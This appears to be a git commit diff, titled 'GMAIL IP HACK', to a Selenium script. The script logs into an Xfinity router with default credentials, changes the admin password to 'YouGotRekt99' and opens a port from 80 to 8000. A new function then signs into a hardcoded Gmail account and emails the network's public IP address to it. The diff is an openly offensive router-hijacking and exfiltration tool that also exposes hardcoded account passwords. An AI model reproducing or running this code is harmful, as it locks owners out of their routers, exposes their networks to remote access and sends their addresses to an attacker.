a9a8be2928c1791ab267f1cd4130e31b4da5dad2
Hunter <hrick@mail.csuchico.edu>
2022-01-19 06:04:28 -0800

    GMAIL IP HACK

--- portforwardScript/portforward.py
+++ portforwardScript/portforward.py
@@ -117,115 +117,121 @@ def spectrum_port_forward(driver):
         exit(1)
 
 def xfinity_port_forward(driver):
+
+    passNeedsReset = True
+
+    WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.ID, "username")) 
+    )  
+
+    username = driver.find_element(By.ID, "username")
+    password = driver.find_element(By.ID, "password")
+    username.clear()
+    password.clear()
+    username.send_keys("admin")
+    password.send_keys("password")
+
+    WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.CLASS_NAME, "btn")) 
+    )
+    time.sleep(3)
+    driver.find_element(By.CLASS_NAME, "btn").click()
     try:
-        passNeedsReset = True
-
-        WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "username")) 
-        )  
-
-        username = driver.find_element(By.ID, "username")
-        password = driver.find_element(By.ID, "password")
-        username.clear()
-        password.clear()
-        username.send_keys("admin")
-        password.send_keys("password")
-
         WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.CLASS_NAME, "btn")) 
         )
         time.sleep(3)
         driver.find_element(By.CLASS_NAME, "btn").click()
-        try:
-            WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.CLASS_NAME, "btn")) 
-            )
-            time.sleep(3)
-            driver.find_element(By.CLASS_NAME, "btn").click()
-        except:
-            passNeedsReset = False
-            pass
-        
-        if passNeedsReset == True:
-            WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.ID, "oldPassword")) 
-            )
-            time.sleep(3)
-            driver.find_element(By.ID, "oldPassword").send_keys("password")
-            driver.find_element(By.ID, "userPassword").send_keys("YouGotRekt99")
-            driver.find_element(By.ID, "verifyPassword").send_keys("YouGotRekt99")
-            driver.find_element(By.ID, "submit_pwd").click()
-            WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.ID, "popup_ok")) 
-            )
-            driver.find_element(By.ID, "popup_ok").click()
-        else:
-            WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "username")) 
-            )  
-            username = driver.find_element(By.ID, "username")
-            password = driver.find_element(By.ID, "password")
-            username.clear()
-            password.clear()
-            username.send_keys("admin")
-            password.send_keys("YouGotRekt99")
-            WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.CLASS_NAME, "btn")) 
-            )
-            time.sleep(3)
-            driver.find_element(By.CLASS_NAME, "btn").click()
-        
+    except:
+        passNeedsReset = False
+        pass
+    
+    if passNeedsReset == True:
         WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "advloc")) 
-            )  
-        driver.find_element(By.ID, "advloc").click()
-        
-        #go to port triggering tab
-        WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='nav']/ul/li[@class='nav-advanced']/ul/li[@class='nav-port-triggering']/a")) 
+            EC.presence_of_element_located((By.ID, "oldPassword")) 
         )
         time.sleep(3)
-        driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='nav']/ul/li[@class='nav-advanced']/ul/li[@class='nav-port-triggering']/a").click()
-        
-        try:
-            #enable port triggering
-            WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/form/div[@class='module']/div[@class='select-row disabled']/span[@id='pt_switch']/ul[@id='port-triggering-switch']/a[1]/li[@class='radioswitch_on']/label")) 
-            )
-            driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/form/div[@class='module']/div[@class='select-row disabled']/span[@id='pt_switch']/ul[@id='port-triggering-switch']/a[1]/li[@class='radioswitch_on']/label").click()
-        except:
-            pass
-
+        driver.find_element(By.ID, "oldPassword").send_keys("password")
+        driver.find_element(By.ID, "userPassword").send_keys("YouGotRekt99")
+        driver.find_element(By.ID, "verifyPassword").send_keys("YouGotRekt99")
+        driver.find_element(By.ID, "submit_pwd").click()
         WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']")) 
-            )  
-        driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']").click()
-
+            EC.presence_of_element_located((By.ID, "popup_ok")) 
+        )
+        driver.find_element(By.ID, "popup_ok").click()
+    else:
+        WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.ID, "username")) 
+        )  
+        username = driver.find_element(By.ID, "username")
+        password = driver.find_element(By.ID, "password")
+        username.clear()
+        password.clear()
+        username.send_keys("admin")
+        password.send_keys("YouGotRekt99")
+        WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.CLASS_NAME, "btn")) 
+        )
         time.sleep(3)
-        
-        service_name_input = driver.find_element(By.ID, "service_name")
-        from_start_port = driver.find_element(By.ID, "from_start_port")
-        from_end_port = driver.find_element(By.ID, "from_end_port")
-        to_start_port = driver.find_element(By.ID, "to_start_port")
-        to_end_port = driver.find_element(By.ID, "to_end_port")
-        
-        service_name_input.clear()
-        service_name_input.send_keys('port51001')
-        
-        from_start_port.clear()
-        from_start_port.send_keys('51001')
-        from_end_port.clear()
-        from_end_port.send_keys('51001')
+        driver.find_element(By.CLASS_NAME, "btn").click()
+    
+    WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.ID, "advloc")) 
+        )  
+    driver.find_element(By.ID, "advloc").click()
+    
+    #go to port triggering tab
+    WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='nav']/ul/li[@class='nav-advanced']/ul/li[@class='nav-port-triggering']/a")) 
+    )
+    time.sleep(3)
+    driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='nav']/ul/li[@class='nav-advanced']/ul/li[@class='nav-port-triggering']/a").click()
+    
+    try:
+        #enable port triggering
+        WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/form/div[@class='module']/div[@class='select-row disabled']/span[@id='pt_switch']/ul[@id='port-triggering-switch']/a[1]/li[@class='radioswitch_on']/label")) 
+        )
+        driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/form/div[@class='module']/div[@class='select-row disabled']/span[@id='pt_switch']/ul[@id='port-triggering-switch']/a[1]/li[@class='radioswitch_on']/label").click()
+    except:
+        pass
 
-        to_start_port.clear()
-        to_start_port.send_keys('51001')
-        to_end_port.clear()
-        to_end_port.send_keys('51001')
+    WebDriverWait(driver, 10).until(
+        EC.element_to_be_clickable((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']")) 
+        )  
+    driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']").click()
 
-        driver.find_element(By.ID, "btn-save-add").click()
-    except Exception as e:
-        print(e)
-        exit(1) 
+    time.sleep(3)
+    
+    WebDriverWait(driver, 10).until(
+        EC.element_to_be_clickable((By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']")) 
+        )  
+    driver.find_element(By.XPATH, "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']").click()
+
+
+    service_name_input = driver.find_element(By.ID, "service_name")
+    from_start_port = driver.find_element(By.ID, "from_start_port")
+    from_end_port = driver.find_element(By.ID, "from_end_port")
+    to_start_port = driver.find_element(By.ID, "to_start_port")
+    to_end_port = driver.find_element(By.ID, "to_end_port")
+    
+    service_name_input.clear()
+    service_name_input.send_keys('port8000')
+    
+    from_start_port.clear()
+    from_start_port.send_keys('80')
+    from_end_port.clear()
+    from_end_port.send_keys('80')
+
+    to_start_port.clear()
+    to_start_port.send_keys('8000')
+    to_end_port.clear()
+    to_end_port.send_keys('8000')
+
+    driver.find_element(By.ID, "btn-save-add").click()
+    #except Exception as e:
+        #print(e)
+        #exit(1) 
 
 def getPublicIP():
     try:
@@ -235,9 +241,101 @@ def getPublicIP():
         print(e)
         exit(1)
 
+def saveIPtoGMAIL(driver):
+    driver.get("https://www.google.com/")
+    
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div[1]/div/div/div/div[2]/a"))
+            )
+    
+    driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/div/div/div[2]/a").click()
+    time.sleep(3)
+        
+    Email = driver.find_element(By.NAME, "identifier")
+    Email.send_keys("infosecpwned87@gmail.com")
+
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
+            )
+    
+    driver.find_element(By.CLASS_NAME ,"VfPpkd-vQzf8d").click()
+
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.NAME, "password"))
+            )
+
+    Password = driver.find_element(By.NAME, "password")
+    Password.send_keys("YouGotRekt99")
+
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
+            )
+    
+    driver.find_element(By.CLASS_NAME ,"VfPpkd-vQzf8d").click()
+
+    try:
+        WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
+                )
+        
+        driver.find_element(By.CLASS_NAME ,"VfPpkd-vQzf8d").click()
+    except:
+        pass
+    
+    try:
+        WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CLASS_NAME, "RveJvd snByac"))
+                )
+        
+        driver.find_element(By.CLASS_NAME ,"RveJvd snByac").click()
+    except:
+        pass
+
+    WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CLASS_NAME, "gb_d"))
+                )
+        
+    driver.find_element(By.CLASS_NAME ,"gb_d").click()
+    
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.XPATH, "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[1]/div[1]/div/div/div/div[1]/div/div"))
+            )
+    
+    driver.find_element(By.XPATH, "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[1]/div[1]/div/div/div/div[1]/div/div").click()
+
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.NAME, "subjectbox"))
+            )
+
+    subject = driver.find_element(By.NAME, "subjectbox")
+
+    subject.send_keys(externalIP)
+    
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CLASS_NAME, "Ha"))
+            )
+    
+    driver.find_element(By.CLASS_NAME ,"Ha").click()
+
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.XPATH, "/html/body/div[7]/div[3]/div/div[1]/div[3]/header/div[2]/div[3]/div[1]/div[2]/div/a/img"))
+            )
+    
+    driver.find_element(By.XPATH ,"/html/body/div[7]/div[3]/div/div[1]/div[3]/header/div[2]/div[3]/div[1]/div[2]/div/a/img").click()
+
+    time.sleep(3)
+
+    WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.ID, "gb_71"))
+            )
+    
+    driver.find_element(By.ID ,"gb_71").click()
+
+    driver.quit()
+
 if __name__=="__main__":
     #Set router of client
-    router = "Skip"
+    router = "Xfinity"
 
     #get default gateway of router
     defaultGateway = get_default_gateway_linux()
@@ -270,16 +368,7 @@ if __name__=="__main__":
         exit(0)
 
     externalIP = getPublicIP()
-    driver.get("https://www.yahoo.com/")
     
-    WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.XPATH, "/html[@id='atomic']/body[@class=' ua-wk ua-linux ua-wk537  l-out Pos-r https fp fp-default dt-default mini-uh-on uh-topbar-on ltr']/header[@id='Header']/div[@id='applet_p_50000372']/div/div[@class='ybar-light ybar-sticky']/div[@id='ybar']/div[@id='ybar-inner-wrap']/div[@class='_yb_mbzxf _yb_opxku']/div[@class='_yb_kfze7 _yb_1bls3']/div[@class='_yb_pwna0 ybar-menu-hover-open']/div[@class='_yb_1ed88']/div[@class='_yb_mg906 _yb_slh5i  _yb_c79rd  _yb_t9h9m  ']/a[@class='_yb_tp791']"))
-        )
-    driver.find_element(By.XPATH, "/html[@id='atomic']/body[@class=' ua-wk ua-linux ua-wk537  l-out Pos-r https fp fp-default dt-default mini-uh-on uh-topbar-on ltr']/header[@id='Header']/div[@id='applet_p_50000372']/div/div[@class='ybar-light ybar-sticky']/div[@id='ybar']/div[@id='ybar-inner-wrap']/div[@class='_yb_mbzxf _yb_opxku']/div[@class='_yb_kfze7 _yb_1bls3']/div[@class='_yb_pwna0 ybar-menu-hover-open']/div[@class='_yb_1ed88']/div[@class='_yb_mg906 _yb_slh5i  _yb_c79rd  _yb_t9h9m  ']/a[@class='_yb_tp791']").click()
-
-
-#except Exception as e:
-    #print(e)
-    #exit(1)
+    saveIPtoGMAIL(driver)
 
 
